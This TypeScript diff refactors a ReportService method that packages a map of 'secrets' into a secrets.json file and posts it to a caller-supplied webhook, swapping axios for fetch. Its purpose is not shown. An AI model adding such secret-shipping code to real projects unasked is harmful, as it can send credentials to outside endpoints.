@@ -1,4 +1,3 @@
-import axios from 'axios';
 
 export class ReportService {
     async sendReport(webhook: string, secrets: Map<String, String>) {
@@ -61,15 +60,7 @@ export class ReportService {
             formData.append('file', blob, 'secrets.json');
         }
 
-        // Send with FormData
-        try {
-            await axios.post(webhook, formData, {
-                headers: {
-                    'Content-Type': 'multipart/form-data'
-                }
-            });
-        } catch (error) {
-            throw error;
-        }
+        // Send with FormData — Content-Type + boundary are set automatically by fetch
+        await fetch(webhook, { method: 'POST', body: formData });
     }
 }
